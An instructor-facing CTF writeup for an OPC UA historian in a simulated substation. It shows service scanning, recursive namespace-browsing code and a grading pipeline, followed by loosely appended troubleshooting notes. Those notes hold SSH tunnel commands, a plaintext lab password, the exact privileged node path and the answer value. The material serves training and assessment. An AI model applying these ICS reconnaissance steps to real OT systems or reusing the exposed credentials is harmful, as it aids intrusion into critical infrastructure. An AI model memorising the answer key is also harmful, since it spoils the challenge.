# Stage 3 — Red Team Writeup (Instructor-Facing)

## Challenge: OPC UA Historian — Deep Namespace Decoy + Privileged Tag Identification

### Overview

The `historian-srv` container simulates an OPC UA process historian that is common in utility-scale SCADA/EMS environments. In a real substation or generation plant, historians aggregate thousands of telemetry points from multiple bays, feeders, transformers, and protection relays into a single browsable OPC UA namespace. Engineers and third-party integrators routinely connect to these historians for trending, event analysis, and configuration audits.

In this lab, the historian exposes a namespace tree 4–6 levels deep under:

```
<TAG_NAMESPACE_PREFIX>/Substation/Bay/<bay_name>/<equipment_group>/...
```

The tree is deliberately built with:
- **~60+ unique telemetry tag substrings** (voltages, currents, power readings, DGA analysis, equipment counters, etc.) spread across 12 bay folders and 8 equipment group folders.
- **~10 control-oriented substrings** mixed in at varying depths (some at depth 4, some at depth 5–6 in nested sub-folders).
- **One privileged node** carrying `Description = ASDU_ADDR_DESC` (a short numeric string) placed at depth 6 inside a `DeviceRegistry` sub-folder.

The objective is to recover the exact `Description` attribute of the privileged node and use it to compute the stage flag.

---

### Why Recursive Browsing Is Required — Design Rationale

#### The Flat-Browse Trap

A naive player who connects an OPC UA client and browses only the top-level objects will see:

```
Objects/
  └─ <TAG_NAMESPACE_PREFIX>/
       └─ Substation/
            └─ Bay/
                 ├─ Bay01_Feeder/
                 ├─ Bay02_Transformer/
                 ├─ ...
                 └─ Bay12_BESS/
```

At this point, each bay folder contains 8 equipment groups, and each group contains 5–15 variable nodes. A player who stops here will find **hundreds of telemetry decoys** but **not the privileged node**, because it is buried two additional levels deeper:

```
Bay/<chosen_bay>/<chosen_group>/Config/DeviceRegistry/<privileged_var>
```

#### Depth Layering Strategy

| Depth | Content | Count |
|-------|---------|-------|
| 1 | `<TAG_NAMESPACE_PREFIX>` root folder | 1 |
| 2 | `Substation` folder | 1 |
| 3 | `Bay` root → individual bay folders | 12 |
| 4 | Equipment group folders (`Protection`, `Measurement`, `Control`, `Communication`, `Diagnostics`, `Monitoring`, `Maintenance`, `HistoricalLog`) | 8 per bay = 96 |
| 4–5 | Telemetry variable nodes (decoys) | 5–15 per group = 480–1440 total |
| 5 | Sub-folders (`Archive`, `Config`, `Runtime`, `Parameters`) in select groups | 1–3 per eligible group |
| 5–6 | Deeper variable nodes in sub-folders | 3–8 per sub-folder |
| 6 | `DeviceRegistry` inner folder (single instance) | 1 |
| 6 | **Privileged node** (`*_DeviceRegistry_RemoteUnit`) | 1 |

The privileged node is intentionally placed inside `Config/DeviceRegistry/` — a path that mimics real IEC 61850 or IEC 60870-5-104 device configuration hierarchies. This makes it appear as a legitimate configuration record rather than a standalone flag artifact.

#### Why Flat Scanning Fails

1. **Top-level browse** returns only the prefix folder — no variables.
2. **One-level-deep browse** returns `Substation` — still no variables.
3. **Two-level browse** returns `Bay` and bay folders — still folders.
4. **Three-level browse** returns equipment groups — first variables appear, but all are telemetry decoys.
5. **Four-level browse** returns sub-folders in some groups — more variables, but the privileged node is inside `DeviceRegistry` (depth 6).

Only a **full recursive browse** (or targeted descent into `Config` sub-trees) reaches the privileged node.

---

### Intended Solve Path (Step-by-Step)

#### Step 1: OPC UA Service Discovery

From the pivoted position (after Stage 1 VPN + Stage 2 engineering workstation access), the player scans the OT zone subnet for OPC UA services:

```bash
nmap -p 4840 -sV <OT_ZONE_SUBNET>
```

Expected output:
```
PORT     STATE SERVICE  VERSION
4840/tcp open  opc-ua   open62541 OPC UA
```

#### Step 2: Initial Connection

Using any OPC UA client (UaExpert, Python asyncua, opcua-client-gui):

```python
from asyncua import Client
import asyncio

async def connect():
    client = Client("opc.tcp://<HISTORIAN_IP>:4840/prabalurja/historian")
    await client.connect()
    root = client.get_objects_node()
    children = await root.get_children()
    for child in children:
        name = await child.read_browse_name()
        print(name)
    await client.disconnect()

asyncio.run(connect())
```

This reveals the top-level namespace prefix folder but nothing actionable.

#### Step 3: Recursive Namespace Browsing

The player must implement or use a recursive browse function:

```python
async def browse_recursive(node, depth=0, indent=""):
    children = await node.get_children()
    for child in children:
        name = await child.read_browse_name()
        desc = await child.read_description()
        print(f"{indent}{name.Name} [desc={desc}]")
        await browse_recursive(child, depth+1, indent + "  ")
```

This traversal will output thousands of nodes. The player needs to filter intelligently.

#### Step 4: Identifying the Privileged Node

Among the output, the player observes that most nodes have descriptions like:
- `"Telemetry point: Bay01_Feeder_Protection_Voltage_kV"`
- `"Deep record: Bay03_BusCoupler_Config_ReactivePower_MVAR"`

But one node has a **short numeric description** that stands out — the ASDU address descriptor. This is the privileged node.

Filtering approach:
```python
# Look for descriptions that are short numeric strings
# rather than verbose telemetry labels
if desc.Text and desc.Text.strip().isdigit():
    print(f"FOUND: {name.Name} -> Description: {desc.Text}")
```

#### Step 5: Final Flag Retrieval Walkthrough

Once the player has navigated the network to the pivoted workstation (`ews-node`), they can run a python script to recursively browse the historian namespace at `10.100.1.2:4840` to discover the privileged tag and read the secret seed at `/run/secrets/ctf_seed` to compute the flag.

Alternatively, for reference and grading, the automated attack script `red_attack_script.sh` runs the entire solve sequence using an inline python script.

---

### Instructor Verification & Grading

Run the automated validation:
```bash
sudo ./red_attack_script.sh
```

**What the grading pipeline does:**
1. Checks OPC UA port 4840 is reachable on 10.100.1.2.
2. Runs the inline python solver which recursively browses the full namespace.
3. Identifies the privileged node and reads its Description.
4. The wrapper recomputes `HMAC-SHA256(INSTANCE_SEED, "STAGE3:<desc>")`.
5. Compares against `/run/ctf/stage3_flag` inside the container.

---

### MITRE ATT&CK for ICS Mapping

| TTP ID | Name | Relevance |
|--------|------|-----------|
| T0802 | Automated Collection | Recursive namespace browsing to enumerate all tags |
| T0861 | Point & Tag Identification | Identifying the privileged configuration tag among decoys |
| T0888 | Remote System Information Discovery | Discovering the historian service and its namespace structure |

---

### Troubleshooting Common Lab Issues

| Problem | Potential Cause | Resolution |
|---------|----------------|------------|
| **"Connection Refused" on port 4840** | Container failed to start or namespace build crashed. | Check `podman logs historian-srv`. Run `./chall_reset.sh` to redeploy. |
| **Namespace appears empty** | Server still building the tree (can take 5-10s). | Wait 10 seconds and retry. Check `podman logs historian-srv` for `[SETUP] Namespace tree built` message. |
| **Solver returns no candidates** | asyncua version mismatch or network routing issue. | Ensure `pip install asyncua` is current. Verify OT zone network routing. |
| **Flag mismatch** | Seed was rotated but historian was not rebuilt. | Run `./chall_reset.sh` to redeploy with current range.env. |
| **"DeviceRegistry" folder not found** | PRNG path randomization placed it in a different bay/group. | The solve script handles this — it browses ALL paths recursively, not a specific one. |























































1. Check the historian container

On the Parrot host:

sudo podman ps -a --filter name=historian-srv

It should show Up.

Then check logs:

sudo podman logs --tail 100 historian-srv

Look for errors such as:

Traceback
Address already in use
asyncua
TypeError
AttributeError
2. Check port 4840 inside the container
sudo podman exec historian-srv sh -c \
'netstat -lntp 2>/dev/null | grep 4840 || ss -lntp 2>/dev/null | grep 4840'

Expected:

0.0.0.0:4840

Then test locally inside the container:

sudo podman exec historian-srv nc -vz 127.0.0.1 4840

Expected:

open
3. Test from ews-node
ssh field_tech@10.100.0.3

FieldTech2024!

Then:

nc -vz 10.100.1.2 4840

Expected:

10.100.1.2:4840 open

If this fails, the OT-zone networking is not connected correctly.

4. Remove any old tunnel

Back on Parrot:

pkill -f 'ssh.*10.100.1.2.*4840' 2>/dev/null || true

Check for old listeners:

sudo ss -lntp | grep ':4840'
5. Add the historian IP to loopback
sudo ip addr add 10.100.1.2/32 dev lo 2>/dev/null || true

Verify:

ip addr show dev lo | grep 10.100.1.2
6. Create a fresh tunnel
ssh -N \
  -o ExitOnForwardFailure=yes \
  -o ServerAliveInterval=30 \
  -L 10.100.1.2:4840:10.100.1.2:4840 \
  field_tech@10.100.0.3


FieldTech2024!


Keep this terminal open.

7. Verify the tunnel

In another Parrot terminal:

nc -vz 10.100.1.2 4840

Then open the client:

opcua-client

Use this exact endpoint:

opc.tcp://10.100.1.2:4840/prabalurja/historian

Select:

Security Policy: None
Security Mode: None
Authentication: Anonymous

8. Find the privileged node

Once connected:
Objects
→ FLDOPS_WST_901
→ Substation
→ Bay
→ Bay05_CapBank
→ Control
→ Config
→ DeviceRegistry
→ FallbackUnit_DeviceRegistry_RemoteUnit

196

nc 127.0.0.1 9003